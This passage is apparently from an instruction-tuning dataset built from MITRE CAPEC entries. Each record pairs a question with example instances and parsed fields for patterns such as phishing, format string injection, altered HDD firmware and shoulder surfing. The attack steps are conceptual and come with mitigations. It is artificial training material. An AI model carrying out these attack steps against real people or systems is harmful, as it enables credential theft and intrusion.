              "Description": "[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": [
                "Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.",
                "Place phishing link in post to online forum."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.",
            "An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Some web development tools to put up a fake website."
        },
        "Indicators": {
          "Indicator": [
            "You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.",
            "You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": [
            "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.",
            "An adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566",
              "Entry_Name": "Phishing"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598",
              "Entry_Name": "Phishing for Information"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-656"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: IP Address Blocking (CAPEC ID: 590)",
    "context": "",
    "output": "Possible examples: Consider situations of information censorship for political purposes, where regimes that prevent access to specific web services.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Consider situations of information censorship for political purposes, where regimes that prevent access to specific web services.",
      "@Name": "IP Address Blocking (CAPEC ID: 590)",
      "attack_ptrn": {
        "@ID": "590",
        "@Name": "IP Address Blocking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary performing this type of attack drops packets destined for a target IP address. The aim is to prevent access to the service hosted at the target IP address.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "603",
            "Exclude_Related": {
              "@Exclude_ID": "514"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Other",
            "Note": "Blocking packets intended for a target IP address denies its availability to the user."
          }
        },
        "Mitigations": {
          "Mitigation": "Have a large pool of backup IPs built into the application and support proxy capability in the application."
        },
        "Example_Instances": {
          "Example": "Consider situations of information censorship for political purposes, where regimes that prevent access to specific web services."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "300"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-475"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-12"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Altered Component Firmware (CAPEC ID: 638)",
    "context": "",
    "output": "In 2014, the Equation group was observed levering known malware tools to conduct component firmware alteration attacks against hard drives. In total, 12 HDD categories were shown to be vulnerable from manufacturers such as Western Digital, HGST, Samsung, and Seagate. Because of their complexity, only a few victims were targeted by these attacks. [REF-664]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In 2014, the Equation group was observed levering known malware tools to conduct component firmware alteration attacks against hard drives. In total, 12 HDD categories were shown to be vulnerable from manufacturers such as Western Digital, HGST, Samsung, and Seagate. Because of their complexity, only a few victims were targeted by these attacks. [REF-664]",
      "@Name": "Altered Component Firmware (CAPEC ID: 638)",
      "attack_ptrn": {
        "@ID": "638",
        "@Name": "Altered Component Firmware",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary exploits systems features and/or improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), with the goal of executing malicious code from within the component's Master Boot Record (MBR). Conducting this type of attack entails the adversary infecting the target with firmware altering malware, using known tools, and a payload. Once this malware is executed, the MBR is modified to include instructions to execute the payload at desired intervals and when the system is booted up. A successful attack will obtain persistence within the victim system even if the operating system is reinstalled and/or if the component is formatted or has its data erased.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "452"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Select Target] The adversary searches for a suitable target to attack, such as government and/or private industry organizations.",
              "Technique": "Conduct reconnaissance to determine potential targets to exploit."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Identify Components] After selecting a target, the adversary determines whether a vulnerable component, such as a specific make and model of a HDD, is contained within the target system.",
              "Technique": [
                "[Remote Access Vector] The adversary gains remote access to the target, typically via additional malware, and explores the system to determine hardware components that are being leveraged.",
                "[Physical Access Vector] The adversary intercepts components in transit and determines if the component is vulnerable to attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Optional: Create Payload] If not using an already existing payload, the adversary creates their own to be executed at defined intervals and upon system boot processes. This payload may then be tested on the target system or a test system to confirm its functionality."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Insert Firmware Altering Malware] Once a vulnerable component has been identified, the adversary leverages known malware tools to infect the component's firmware and drop the payload within the component's MBR. This allows the adversary to maintain persistence on the target and execute the payload without being detected.",
              "Technique": [
                "The adversary inserts the firmware altering malware on the target component, via the use of known malware tools.",
                "[Physical Access Vector] The adversary then sends the component to its original intended destination, where it will be installed onto a victim system."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge about the target component's firmware",
            "Advanced knowledge about Master Boot Records (MBR)",
            "Advanced knowledge about tools used to insert firmware altering malware.",
            "Advanced knowledge about component shipments to the target organization."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Ability to access and reverse engineer hardware component firmware."
            },
            {
              "@Level": "High",
              "#text": "Ability to intercept components in transit."
            },
            {
              "@Level": "Medium",
              "#text": "Ability to create malicious payload to be executed from MBR."
            },
            {
              "@Level": "Low",
              "#text": "Ability to leverage known malware tools to infect target system and insert firmware altering malware/payload"
            }
          ]
        },
        "Resources_Required": {
          "Resource": [
            "Manufacturer source code for hardware components.",
            "Malware tools used to insert malware and payload onto target component.",
            "Either remote or physical access to the target component."
          ]
        },
        "Indicators": {
          "Indicator": [
            "Output observed from processes, API calls, or Self-Monitoring, Analysis and Reporting Technology (SMART) may provide insight into malicious modifications of MBRs.",
            "Digital forensics tools may produce output that indicates an attack of this nature has occurred. Examples include unexpected disk partitions and/or unusual strings."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Authentication",
                "Authorization"
              ],
              "Impact": [
                "Gain Privileges",
                "Execute Unauthorized Commands",
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": [
                "Read Data",
                "Modify Data"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Leverage hardware components known to not be susceptible to these types of attacks.",
            "Implement hardware RAID infrastructure."
          ]
        },
        "Example_Instances": {
          "Example": "In 2014, the Equation group was observed levering known malware tools to conduct component firmware alteration attacks against hard drives. In total, 12 HDD categories were shown to be vulnerable from manufacturers such as Western Digital, HGST, Samsung, and Seagate. Because of their complexity, only a few victims were targeted by these attacks. [REF-664]"
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1542.002",
            "Entry_Name": "Pre-OS Boot:Component Firmware"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-664"
            },
            {
              "@External_Reference_ID": "REF-665"
            },
            {
              "@External_Reference_ID": "REF-666"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Date": "2018-07-31"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Consequences, Description, Example_Instances, Execution_Flow, Indicators, Mitigations, Prerequisites, References, Resources_Required, Skills_Required, Typical_Severity"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Format String Injection (CAPEC ID: 135)",
    "context": "",
    "output": "Examples of Format String Injection (CAPEC ID: 135) are: Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a \"../po\" directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a \"../po\" directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027",
      "@Name": "Format String Injection (CAPEC ID: 135)",
      "attack_ptrn": {
        "@ID": "135",
        "@Name": "Format String Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "137",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey application] The adversary takes an inventory of the entry points of the application.",
              "Technique": [
                "Spider web sites for all available links",
                "List parameters, external variables, configuration files variables, etc. that are possibly used by the application."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.",
              "Technique": "Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.",
              "Technique": "Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Access Control",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Access Control",
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Limit the usage of formatting string functions.",
            "Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters."
          ]
        },
        "Example_Instances": {
          "Example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a \"../po\" directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "134"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "74"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Format string attack"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-14"
            },
            {
              "@External_Reference_ID": "REF-15",
              "@Section": "WASC-06 - Format String"
            },
            {
              "@External_Reference_ID": "REF-616",
              "@Section": "Testing for Format String Injection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Documentation Alteration to Cause Errors in System Design (CAPEC ID: 519)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Documentation Alteration to Cause Errors in System Design (CAPEC ID: 519) are: During operation, a firewall will restart various subsystems to reload and implement new rules as added by the user. An attacker alters the software design dependencies in the manufacturer's documentation so that under certain predictable conditions the reload will fail to load in rules resulting in a \"fail open\" state. Once deployed at a victim site, this will allow the attacker to bypass the victim's firewall.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "During operation, a firewall will restart various subsystems to reload and implement new rules as added by the user. An attacker alters the software design dependencies in the manufacturer's documentation so that under certain predictable conditions the reload will fail to load in rules resulting in a \"fail open\" state. Once deployed at a victim site, this will allow the attacker to bypass the victim's firewall.",
      "@Name": "Documentation Alteration to Cause Errors in System Design (CAPEC ID: 519)",
      "attack_ptrn": {
        "@ID": "519",
        "@Name": "Documentation Alteration to Cause Errors in System Design",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge of software capabilities of a manufacturer's product.",
            "Access to the manufacturer's documentation."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in system design."
            },
            {
              "@Level": "High",
              "#text": "Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Digitize documents and cryptographically sign them to verify authenticity.",
            "Password protect documents and make them read-only for unauthorized users.",
            "Avoid emailing important documents and configurations.",
            "Ensure deleted files are actually deleted.",
            "Maintain multiple instances of the document across different privileged users for recovery and verification."
          ]
        },
        "Example_Instances": {
          "Example": "During operation, a firewall will restart various subsystems to reload and implement new rules as added by the user. An attacker alters the software design dependencies in the manufacturer's documentation so that under certain predictable conditions the reload will fail to load in rules resulting in a \"fail open\" state. Once deployed at a victim site, this will allow the attacker to bypass the victim's firewall."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-715"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Shoulder Surfing (CAPEC ID: 508)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Shoulder Surfing (CAPEC ID: 508) are: An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.\nAn adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.\nAn insider could obtain database credentials for an application and sell the credentials on the black market.\nAn insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.",
        "An adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.",
        "An insider could obtain database credentials for an application and sell the credentials on the black market.",
        "An insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum."
      ],
      "@Name": "Shoulder Surfing (CAPEC ID: 508)",
      "attack_ptrn": {
        "@ID": "508",
        "@Name": "Shoulder Surfing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In a shoulder surfing attack, an adversary observes an unaware individual's keystrokes, screen content, or conversations with the goal of obtaining sensitive information. One motive for this attack is to obtain sensitive information about the target for financial, personal, political, or other gains. From an insider threat perspective, an additional motive could be to obtain system/application credentials or cryptographic keys. Shoulder surfing attacks are accomplished by observing the content \"over the victim's shoulder\", as implied by the name of this attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "651",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary typically requires physical proximity to the target's environment, in order to observe their screen or conversation. This may not be the case if the adversary is able to record the target and obtain sensitive information upon review of the recording."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "In most cases, an adversary can simply observe and retain the desired information."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Likelihood": "High"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Be mindful of your surroundings when discussing or viewing sensitive information in public areas.",
            "Pertaining to insider threats, ensure that sensitive information is not displayed to nor discussed around individuals without need-to-know access to said information."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.",
            "An adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.",
            "An insider could obtain database credentials for an application and sell the credentials on the black market.",
            "An insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "359"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Exploitation of Improperly Controlled Hardware Security Identifiers (CAPEC ID: 681), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: A system contains a register (divided into four 32-bit registers) that is used to store a 128-bit AES key for encryption/decryption, in addition to an access-policy register. The access-policy register determines which agents may access the AES-key registers, based on a corresponding security identifier. It is assumed the system has two agents: a Main-controller and an Aux-controller, with respective security identifiers \"1\" and \"2\". The Main-controller (ID \"1\") is meant to have access to the AES-key registers, while the Aux-controller (ID \"2\") has access to the access-policy register. If a SoC incorrectly generates security identifier \"1\" for both agents, then both agents will have access to the AES-key registers. This could further result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A system contains a register (divided into four 32-bit registers) that is used to store a 128-bit AES key for encryption/decryption, in addition to an access-policy register. The access-policy register determines which agents may access the AES-key registers, based on a corresponding security identifier. It is assumed the system has two agents: a Main-controller and an Aux-controller, with respective security identifiers \"1\" and \"2\". The Main-controller (ID \"1\") is meant to have access to the AES-key registers, while the Aux-controller (ID \"2\") has access to the access-policy register. If a SoC incorrectly generates security identifier \"1\" for both agents, then both agents will have access to the AES-key registers. This could further result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access.",
      "@Name": "Exploitation of Improperly Controlled Hardware Security Identifiers (CAPEC ID: 681)",
      "attack_ptrn": {
        "@ID": "681",
        "@Name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "An adversary takes advantage of missing or incorrectly configured security identifiers (e.g., tokens), which are used for access control within a System-on-Chip (SoC), to read/write data or execute a given action."
        },
        "Extended_Description": {
          "xhtml:p": [
            "A System-on-Chip (SoC) often implements a security identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, these mechanisms may be exploitable due to any number of the following:",
            "If the security identifiers leveraged by the SoC are missing or misconfigured, an adversary may be able to take advantage of this shortcoming to circumvent the intended access controls. This could result in the adversary gaining unintended access, performing a Denial of Service (DoS), escalating privileges, or spoofing actions from a trusted agent."
          ],
          "xhtml:ul": {
            "xhtml:li": [
              "The security identifiers are missing",
              "The security identifiers are incorrectly implemented or generated",
              "The security identifiers are generated with an obsolete encoding",
              "The security identifiers are generated and implemented correctly, but are improperly protected"
            ]
          }
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "1",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "180",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Awareness of the hardware being leveraged.",
            "Access to the hardware being leveraged."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Ability to execute actions within the SoC."
            },
            {
              "@Level": "High",
              "#text": "Intricate knowledge of the identifiers being utilized."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Review generation of security identifiers for design inconsistencies and common weaknesses.",
            "Review security identifier decoders for design inconsistencies and common weaknesses.",
            "Test security identifier definition, access, and programming flow in both pre-silicon and post-silicon environments."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A system contains a register (divided into four 32-bit registers) that is used to store a 128-bit AES key for encryption/decryption, in addition to an access-policy register. The access-policy register determines which agents may access the AES-key registers, based on a corresponding security identifier. It is assumed the system has two agents: a Main-controller and an Aux-controller, with respective security identifiers \"1\" and \"2\". The Main-controller (ID \"1\") is meant to have access to the AES-key registers, while the Aux-controller (ID \"2\") has access to the access-policy register. If a SoC incorrectly generates security identifier \"1\" for both agents, then both agents will have access to the AES-key registers. This could further result in a Denial-of-Service (DoS) or the execution of an action that in turn could result in privilege escalation or unintended access."
          }
        },
